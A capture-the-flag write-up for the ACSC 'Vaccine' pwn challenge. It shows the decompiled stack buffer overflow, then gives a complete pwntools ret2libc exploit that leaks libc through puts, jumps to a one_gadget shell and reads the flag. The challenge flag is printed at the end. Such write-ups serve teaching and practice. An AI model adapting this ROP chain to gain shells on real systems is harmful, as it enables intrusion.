# Vaccine

## Information
**Category** | **Points** 
--- | --- 
Warmup + Pwn | 50 

## Description:

Give me the correct vaccine to view my secret

## Solution

We first need to build a docker from the Dockerfile to get the right version of libc for our binary.

Analyse the program, i notice that there’s only the main() function.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rbx
  char v5[112]; // [rsp+10h] [rbp-170h] BYREF
  char s2[112]; // [rsp+80h] [rbp-100h] BYREF
  char s[104]; // [rsp+F0h] [rbp-90h] BYREF
  FILE *v8; // [rsp+158h] [rbp-28h]
  FILE *stream; // [rsp+160h] [rbp-20h]
  int i; // [rsp+16Ch] [rbp-14h]

  stream = fopen("RNA.txt", "r");
  fgets(s, 100, stream);
  printf("Give me vaccine: ");
  fflush(_bss_start);
  __isoc99_scanf("%s", s2);
  for ( i = 0; ; ++i )
  {
    v3 = i;
    if ( v3 >= strlen(s2) )
      break;
    if ( s2[i] != 65 && s2[i] != 67 && s2[i] != 71 && s2[i] != 84 )
    {
      puts("Only DNA codes allowed!");
      exit(0);
    }
  }
  if ( strcmp(s, s2) )
  {
    puts("Oops.. Try again later");
    exit(0);
  }
  puts("Congrats! You give the correct vaccine!");
  v8 = fopen("secret.txt", "r");
  fgets(v5, 100, v8);
  printf("Here is your reward: %s\n", v5);
  return 0;
}
```

It’s a simple buffer overflow exploit. To bypass the strcmp() we only need to input a bunch of NULL char (0x00). However,the ‘secret.txt’ file doesn’t contain the flag.

Now simply just take control of the shell by ret2libc technique since we already have the right libc version.

```py
from pwn import *

exe = ELF('./vaccine')
libc = ELF('./libc-2.31.so')

#io = remote('vaccine.chal.ctf.acsc.asia', 1337)
io = exe.process()
#gdb.attach(io, api=True)
#context.log_level = 'debug'

# Gadgets:
puts = 0x0000000000084420 # Offset that we took from the libc
pop_rdi = 0x0000000000401443
ret = 0x000000000040101a
main = 0x0000000000401236

# Leaking libc
io.recvuntil(b'vaccine:')
payload = b'\0'*264
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(main)
io.sendline(payload)
print(io.recvuntil(b' reward: '))
print(io.recvuntil(b'\n'))
leak_puts = int.from_bytes(io.recvline(keepends=False), byteorder='little')
print(hex(leak_puts))
libc.address = leak_puts - puts
print(f'Libc base: {hex(libc.address)}')

one_gadget = 0xe3b01
payload = b'\0'*264
payload += p64(libc.address + one_gadget)
io.sendline(payload)
time.sleep(0.5)
io.sendline(b'cat flag.txt')
io.interactive()
```

Run the script in remote and we will get:

```sh
[*] '/mnt/d/ctf/pwn/acsc/vaccine/bin/vaccine'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] '/mnt/d/ctf/pwn/acsc/vaccine/bin/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to vaccine.chal.ctf.acsc.asia on port 1337: Done
b' Congrats! You give the correct vaccine!\nHere is your reward: '
b'your flag is in another castle\n'
0x7f62767bf420
Libc base: 0x7f627673b000
[*] Switching to interactive mode
Give me vaccine: ACSC{RoP_3@zy_Pe4$y}
```

> Flag is: ACSC{RoP_3@zy_Pe4$y}
